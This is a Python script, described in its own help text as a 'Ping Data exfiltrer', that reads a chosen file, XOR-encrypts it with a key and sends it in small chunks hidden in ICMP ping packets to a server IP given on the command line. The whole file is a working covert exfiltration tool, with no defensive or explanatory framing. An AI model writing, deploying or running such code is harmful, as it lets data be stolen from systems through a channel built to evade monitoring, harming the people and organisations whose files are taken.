#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from scapy.all import IP,ICMP,Raw, send
from time import sleep
import argparse as ap
from os import path

PACKETLENGTH = 50
SLEEPTIME = 0.1
HEADER = 'XuV3'


def cipher(fileName, data, key):
    data = bytearray(fileName + ':','utf-8')+data
    cipheredData = ''.join(chr(char ^ ord(key[index%len(key)])) for index, char in enumerate(data))
    return cipheredData

def sendData(data, ip):
    data = HEADER+data
    pckt = IP(dst=ip)/ICMP()/Raw(load=data)
    send(pckt,verbose=0)


def convertTime(time):
    if time < 60:
        return str(time)+" s"
    sec = time % 60
    min = time // 60
    if min<60:
        return str(min)+ " min" + str(sec)+" s"
    hour = min // 60
    min = min % 60
    return str(hour)+" h" + str(min)+ " min" + str(sec)+" s"


def run(file, key, server):

    if file == None:
        print('Nothing to send. Aborting operation...')
        return

    with open(file, 'rb') as f:
        fileSize = path.getsize(file)
        dataPerPacket = PACKETLENGTH-len(file)-len(HEADER)
        packetNumber = round(fileSize / dataPerPacket)+1
        packetSent = 0
        print("#### Packet to send : ",packetNumber)
        timeToSend =  (packetNumber-1)*SLEEPTIME

        print("Estimated time to send all packets : %s" % convertTime(timeToSend))
        while (data := f.read(dataPerPacket)):
            cipheredData = cipher(file, data, key)
            print(data)
            sendData(cipheredData, server)
            packetSent += 1
            print("\rPacket : %i/%i" % (packetSent,packetNumber),end='')
            sleep(SLEEPTIME)

def main():
    parser = ap.ArgumentParser(description="Ping Data exfiltrer")
    parser.add_argument('ip', help='Server IP address')
    parser.add_argument('key', help='The key to encrypt the data.')
    parser.add_argument('-f', '--file', default=None, help='File to exfiltrate.')
    args = parser.parse_args()

    run(args.file, args.key, args.ip)

if __name__ == '__main__':
    main()